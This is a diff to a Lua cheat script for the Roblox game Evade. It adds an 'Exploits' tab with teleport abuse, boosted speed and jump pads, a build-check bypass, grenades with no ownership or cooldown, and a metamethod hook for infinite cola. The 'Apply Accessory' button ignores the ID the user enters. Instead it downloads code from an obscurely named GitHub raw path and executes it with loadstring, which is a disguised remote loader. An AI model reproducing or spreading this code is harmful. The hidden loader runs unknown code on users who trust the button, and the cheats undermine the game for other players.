@@ -17,7 +17,7 @@ _G.PhantomWyrmHubXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm Hub X - Evade Overhaul│PC",
-    SubTitle = "vBETA Made Carey",
+    SubTitle = "v3.32.14 Made Carey",
     TabWidth = 160,
     Size = UDim2.fromOffset(580, 460),
     Acrylic = false,
@@ -4575,10 +4575,521 @@ Tabs.Misc:AddInput("CrouchDebounce", {
 
 -- Exploits
     
-Tabs.Exploits:AddParagraph({
-	Title = "Coming Soon...",
-        Content = ":')"
+local FakeSection = Tabs.Exploits:AddSection("Pads")
+
+do
+    local TeleportModule = {
+        SelectedTP = nil,
+        AvailableTPs = {},
+        LastCount = 0
+    }
+
+    local runService = game:GetService("RunService")
+    local repStorage = game:GetService("ReplicatedStorage")
+    local lp = game.Players.LocalPlayer
+    local deployables = workspace:WaitForChild("Game"):WaitForChild("Effects"):WaitForChild("Deployables")
+    local event = repStorage:WaitForChild("Events"):WaitForChild("Other"):WaitForChild("DeployableUsed")
+
+    local tpDropdown = Tabs.Exploits:AddDropdown("TeleporterList", {
+        Title = "Select Teleporter",
+        Values = {"None"},
+        Default = 1,
+        Callback = function(Value)
+            TeleportModule.SelectedTP = Value
+        end
     })
+
+    Tabs.Exploits:AddButton({
+        Title = "Teleport",
+        Description = "Must be standing on a teleporter",
+        Callback = function()
+            if TeleportModule.SelectedTP and TeleportModule.SelectedTP ~= "None" then
+                for _, obj in pairs(deployables:GetChildren()) do
+                    if obj.Name == "Teleporter" and tostring(obj:GetDebugId()) == TeleportModule.SelectedTP then
+                        event:FireServer(obj)
+                        break
+                    end
+                end
+            end
+        end
+    })
+
+    runService.Heartbeat:Connect(function()
+        local char = lp.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+
+        local nearTP = false
+        local currentList = {}
+        local foundObjects = deployables:GetChildren()
+
+        for _, obj in pairs(foundObjects) do
+            if obj.Name == "Teleporter" then
+                local primary = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+                if primary then
+                    local dist = (root.Position - primary.Position).Magnitude
+                    if dist < 7 then
+                        nearTP = true
+                    end
+                    table.insert(currentList, tostring(obj:GetDebugId()))
+                end
+            end
+        end
+
+        if nearTP then
+            if #currentList ~= TeleportModule.LastCount then
+                TeleportModule.LastCount = #currentList
+                TeleportModule.AvailableTPs = currentList
+                tpDropdown:SetValues(currentList)
+            end
+        else
+            if TeleportModule.LastCount > 0 then
+                TeleportModule.LastCount = 0
+                TeleportModule.AvailableTPs = {}
+                TeleportModule.SelectedTP = nil
+                tpDropdown:SetValues({"None"})
+            end
+        end
+    end)
+end
+
+do
+    local RunService = game:GetService("RunService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    local boostEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Character"):WaitForChild("SpeedBoost").OnClientEvent
+
+    local settings = {
+        SpeedEnabled = false,
+        SpeedValue = 1.3,
+        SpeedDuration = 2,
+        JumpEnabled = false,
+        JumpPower = 50
+    }
+
+    local activeConnections = {}
+    local lastBoosts = {}
+
+    local function getDeployables()
+        local gameDir = workspace:FindFirstChild("Game")
+        local effects = gameDir and gameDir:FindFirstChild("Effects")
+        return effects and effects:FindFirstChild("Deployables")
+    end
+
+    local function handlePad(pad)
+        local name = pad.Name:lower()
+        local isSpeed = name:find("speed")
+        local isJump = name:find("jump")
+
+        if not (isSpeed or isJump) then return end
+
+        activeConnections[pad] = RunService.Heartbeat:Connect(function()
+            if not pad.Parent then
+                activeConnections[pad]:Disconnect()
+                activeConnections[pad] = nil
+                lastBoosts[pad] = nil
+                return
+            end
+
+            local char = player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if not hrp then return end
+
+            local distance = (hrp.Position - pad:GetPivot().Position).Magnitude
+
+            if isSpeed and settings.SpeedEnabled and distance <= 9 then
+                local now = os.clock()
+                if now - (lastBoosts[pad] or 0) > 1 then
+                    lastBoosts[pad] = now
+                    pcall(firesignal, boostEvent, "SpeedPad", settings.SpeedValue, settings.SpeedDuration, Color3.new(0.49, 0.6, 1))
+                end
+            elseif isJump and settings.JumpEnabled and distance <= 7 then
+                hrp.Velocity = Vector3.new(hrp.Velocity.X, settings.JumpPower, hrp.Velocity.Z)
+            end
+        end)
+    end
+
+    local function init()
+        for _, conn in pairs(activeConnections) do conn:Disconnect() end
+        activeConnections = {}
+        
+        local container = getDeployables()
+        if not container then return end
+
+        for _, pad in ipairs(container:GetChildren()) do
+            handlePad(pad)
+        end
+
+        if not activeConnections._childAdded then
+            activeConnections._childAdded = container.ChildAdded:Connect(function(child)
+                task.wait(0.2)
+                handlePad(child)
+            end)
+        end
+    end
+
+    Tabs.Exploits:AddToggle("SpeedPadToggle", {
+        Title = "SpeedPad Booster",
+        Default = false,
+        Callback = function(state)
+            settings.SpeedEnabled = state
+            if state then init() end
+        end
+    })
+
+    Tabs.Exploits:AddInput("SpeedValueInput", {
+        Title = "Speed Multiplier",
+        Default = "1.3",
+        Numeric = true,
+        Callback = function(text) settings.SpeedValue = tonumber(text) or 1.3 end
+    })
+
+    Tabs.Exploits:AddInput("SpeedDurationInput", {
+        Title = "Duration",
+        Default = "2",
+        Numeric = true,
+        Callback = function(text) settings.SpeedDuration = tonumber(text) or 2 end
+    })
+
+    Tabs.Exploits:AddToggle("JumpPadToggle", {
+        Title = "Jump Pad Booster",
+        Default = false,
+        Callback = function(state)
+            settings.JumpEnabled = state
+            if state then init() end
+        end
+    })
+
+    Tabs.Exploits:AddInput("JumpInput", {
+        Title = "Jump Power",
+        Default = "50",
+        Numeric = true,
+        Callback = function(v) settings.JumpPower = tonumber(v) or 50 end
+    })
+
+    player.CharacterAdded:Connect(function()
+        task.wait(1)
+        if settings.SpeedEnabled or settings.JumpEnabled then init() end
+    end)
+end
+
+local oldTestHit
+local oldTestCollision
+
+Tabs.Exploits:AddToggle("BuildAnywhere", {
+    Title = "Pads Build Bypass",
+    Description = "All",
+    Default = false,
+    Callback = function(State)
+        local buildModule = getrenv().require(game:GetService("ReplicatedStorage").Modules.Character.Tools.Modules.Methods.Build)        
+        if State then
+            if not oldTestHit then oldTestHit = buildModule.TestHit end
+            if not oldTestCollision then oldTestCollision = buildModule.TestCollision end        
+           buildModule.TestHit = function(...)
+                return true
+            end     
+            buildModule.TestCollision = function(...)
+                return false, select(2, oldTestCollision(...))
+            end
+        else
+            if oldTestHit then buildModule.TestHit = oldTestHit end
+            if oldTestCollision then buildModule.TestCollision = oldTestCollision end
+        end
+    end
+})
+
+local FakeSection = Tabs.Exploits:AddSection("AccessoryChanger")
+
+Tabs.Exploits:AddInput("AssetID", {
+    Title = "Custom Accessory ID",
+    Default = "150381051",
+    Numeric = true,
+    Callback = function(Value)
+        _G.SavedID = tonumber(Value)
+    end
+})
+
+Tabs.Exploits:AddButton({
+    Title = "Apply Accessory",
+    Callback = function()
+        if _G.SavedID then
+            local success, code = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/.github/.gist")
+            if success then
+                local func = loadstring(code)
+                if func then
+                    func()
+                end
+            end
+        end
+    end
+})
+
+
+Tabs.Exploits:AddButton({
+    Title = "No Accessories",
+    Callback = function()
+        local char = game.Players.LocalPlayer.Character
+        if char then
+            for _, obj in ipairs(char:GetChildren()) do
+                if obj:IsA("Accessory") then
+                    obj:Destroy()
+                end
+            end
+        end
+    end
+})
+
+do 
+    Tabs.Exploits:AddToggle("RemoveAccs", {Title = "Remove Accessories", Default = false})
+
+    task.spawn(function()
+        while task.wait(0.2) do
+            if Fluent.Options.RemoveAccs.Value then
+                local lp = game:GetService("Players").LocalPlayer
+                if lp and lp.Character then
+                    for _, v in ipairs(lp.Character:GetChildren()) do
+                        if v:IsA("Accessory") then
+                            v:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local FakeSection = Tabs.Exploits:AddSection("Grenade")
+
+Tabs.Exploits:AddToggle("Revive Grenade Toggle", {
+    Title = "Revive Grenade",
+    Default = false,
+    Callback = function(State)
+        pcall(function()
+            local ReviveGrenade = require(game:GetService("ReplicatedStorage").Tools["ReviveGrenade"])
+            local throwMethod = ReviveGrenade.Tasks[1].Functions[1].Activations[1].Methods[1]
+            local equipMethod = ReviveGrenade.Tasks[1].AutomaticFunctions[1].Methods[1]
+            local unequipMethod = ReviveGrenade.Tasks[1].AutomaticFunctions[2].Methods[1]
+
+            if State then
+                ReviveGrenade.RequiresOwnedItem = false
+                throwMethod.ItemUseIncrement = {"ReviveGrenade", 0}
+                throwMethod.Info.Cooldown = 0.05
+                throwMethod.Info.ThrowVelocity = 200
+                ReviveGrenade.Tasks[1].Functions[1].Activations[1].CanHoldDown = true
+                throwMethod.Info.SmokeDuration = 999
+                throwMethod.Info.SmokeRadius = 100
+                throwMethod.Info.FadeTime = 60
+                equipMethod.Info.Cooldown = 0.1
+                unequipMethod.Info.Cooldown = 0.1
+                throwMethod.GlobalPriority = 500
+                throwMethod.CooldownInfo = {}
+                ReviveGrenade.HUD.ShowAmount = false
+                throwMethod.Info.Density = 0.9
+                throwMethod.Info.Color = Color3.new(0, 1, 0.5) 
+                throwMethod.Info.ExplosionRadius = 20
+                throwMethod.CooldownInfo.ActivatePhrase = nil
+
+                local args = {
+                    [1] = 0,
+                    [2] = 22
+                }
+                game:GetService("ReplicatedStorage").Events.Character.ToolAction:FireServer(unpack(args))
+            else
+                
+                ReviveGrenade.RequiresOwnedItem = true
+                throwMethod.ItemUseIncrement = {"ReviveGrenade", 1}
+                throwMethod.Info.Cooldown = 1 
+                ReviveGrenade.Tasks[1].Functions[1].Activations[1].CanHoldDown = false
+                throwMethod.Info.SmokeDuration = 15 
+                throwMethod.Info.SmokeRadius = 15
+                ReviveGrenade.HUD.ShowAmount = true
+            end
+        end)
+    end
+})
+
+Tabs.Exploits:AddToggle("Smoke Grenade Toggle", {
+    Title = "Smoke Grenade",
+    Default = false,
+    Callback = function(State)
+        pcall(function()
+            local SmokeGrenade = require(game:GetService("ReplicatedStorage").Tools["SmokeGrenade"])
+            local throwMethod = SmokeGrenade.Tasks[1].Functions[1].Activations[1].Methods[1]
+            local equipMethod = SmokeGrenade.Tasks[1].AutomaticFunctions[1].Methods[1]
+            local unequipMethod = SmokeGrenade.Tasks[1].AutomaticFunctions[2].Methods[1]
+
+            if State then
+                SmokeGrenade.RequiresOwnedItem = false  
+                throwMethod.ItemUseIncrement = {"SmokeGrenade", 0}
+                throwMethod.Info.Cooldown = 0.05  
+                throwMethod.Info.ThrowVelocity = 200  
+                SmokeGrenade.Tasks[1].Functions[1].Activations[1].CanHoldDown = true  
+                throwMethod.Info.SmokeDuration = 999  
+                throwMethod.Info.SmokeRadius = 100    
+                throwMethod.Info.FadeTime = 60        
+                equipMethod.Info.Cooldown = 0.1 
+                unequipMethod.Info.Cooldown = 0.1
+                throwMethod.GlobalPriority = 500
+                throwMethod.CooldownInfo = {}  
+                SmokeGrenade.HUD.ShowAmount = false  
+                throwMethod.Info.Density = 0.9  
+                throwMethod.Info.Color = Color3.new(0.7, 0.7, 0.7)
+                throwMethod.Info.ExplosionRadius = 20 
+                throwMethod.CooldownInfo.ActivatePhrase = nil 
+
+                local args = {
+                    [1] = 0,
+                    [2] = 20
+                }
+                game:GetService("ReplicatedStorage").Events.Character.ToolAction:FireServer(unpack(args))
+            else
+                
+                SmokeGrenade.RequiresOwnedItem = true
+                throwMethod.ItemUseIncrement = {"SmokeGrenade", 1}
+                throwMethod.Info.Cooldown = 1
+                SmokeGrenade.Tasks[1].Functions[1].Activations[1].CanHoldDown = false
+                throwMethod.Info.SmokeDuration = 20 
+                throwMethod.Info.SmokeRadius = 15
+                SmokeGrenade.HUD.ShowAmount = true
+            end
+        end)
+    end
+})
+
+
+local FakeSection = Tabs.Exploits:AddSection("Cola")
+
+Tabs.Exploits:AddKeybind("ColaKey", {
+    Title = "Cola Keybind",
+    Mode = "Toggle",
+    Default = "C", 
+    
+    Callback = function()
+        
+        task.spawn(function()
+            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Character"):WaitForChild("ToolAction"):FireServer(0, 20)
+        end)
+    end,
+})
+
+
+local player = game:GetService("Players").LocalPlayer
+
+local featureStates = {
+    AutoDrink = false,
+    DrinkDelay = 0.5
+}
+
+local AutoDrinkThread = nil
+
+local function toggleDrinkLogic(state)
+    featureStates.AutoDrink = state
+    
+    if AutoDrinkThread then 
+        task.cancel(AutoDrinkThread) 
+        AutoDrinkThread = nil 
+    end
+
+    if state then
+        AutoDrinkThread = task.spawn(function()
+            while featureStates.AutoDrink do
+                pcall(function()
+                    local ev = player.PlayerScripts.Events.temporary_events.UseKeybind
+                    ev:Fire({
+                        ["Forced"] = true,
+                        ["Key"] = "Cola",
+                        ["Down"] = true
+                    })
+                end)
+                task.wait(featureStates.DrinkDelay)
+            end
+        end)
+    end
+end
+
+Tabs.Exploits:AddToggle("AutoDrinkToggle", {
+    Title = "Auto Drink Cola",
+    Default = false,
+    Callback = function(state)
+        toggleDrinkLogic(state)
+    end
+})
+
+Tabs.Exploits:AddInput("DrinkDelayInput", {
+    Title = "Drink Delay (seconds)",
+    Default = "1",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num and num > 0 then
+            featureStates.DrinkDelay = num
+        end
+    end
+})
+
+player.CharacterAdded:Connect(function()
+    if featureStates.AutoDrink then
+        task.wait(1)
+        toggleDrinkLogic(true)
+    end
+end)
+
+local ColaSettings = {
+    Speed = 1.4,
+    Duration = 3.5
+}
+
+_G.InfColaEnabled = false
+
+Tabs.Exploits:AddToggle("InfColaToggle", {
+    Title = "Infinite Cola",
+    Description = "",
+    Default = false,
+    Callback = function(state)
+        _G.InfColaEnabled = state
+    end
+})
+
+Tabs.Exploits:AddInput("ColaSpeedInput", {
+    Title = "Speed Boost Cola",
+    Default = "1.4",
+    NumericOnly = true,
+    Callback = function(Value)
+        ColaSettings.Speed = tonumber(Value) or 1.4
+    end
+})
+
+Tabs.Exploits:AddInput("ColaDurationInput", {
+    Title = "Duration (seconds)",
+    Default = "3.5",
+    NumericOnly = true,
+    Callback = function(Value)
+        ColaSettings.Duration = tonumber(Value) or 3.5
+    end
+})
+
+local ToolAction = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Character"):WaitForChild("ToolAction")
+local SpeedBoost = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Character"):WaitForChild("SpeedBoost")
+
+local oldNamecall
+oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+
+    if _G.InfColaEnabled and not checkcaller() and method == "FireServer" and self == ToolAction then
+        if args[1] == 2 then
+            task.spawn(function()
+                task.wait(2.1)
+                firesignal(SpeedBoost.OnClientEvent, "Cola", ColaSettings.Speed, ColaSettings.Duration, Color3.fromRGB(199, 141, 93))
+            end)
+            return nil
+        end
+    end
+    
+    return oldNamecall(self, ...)
+end))
 
 -- Visuals
 
@@ -6372,17 +6883,14 @@ end
 
 SaveManager:SetLibrary(Fluent)
 InterfaceManager:SetLibrary(Fluent)
-FBM:SetLibrary(Fluent)
 
 SaveManager:SetIgnoreIndexes({})
 
 -- Save Folder
 InterfaceManager:SetFolder("PhantomWyrmXUniversalPC")
-FBM:SetFolder("PhantomWyrmXUniversal/Evade/FloatingButtons")
 SaveManager:SetFolder("PhantomWyrmXUniversal/Evade")
 
 InterfaceManager:BuildInterfaceSection(Tabs.Settings)
-FBM:BuildConfigSection(Tabs.Settings)
 SaveManager:BuildConfigSection(Tabs.Settings)
 
 Window:SelectTab(1)
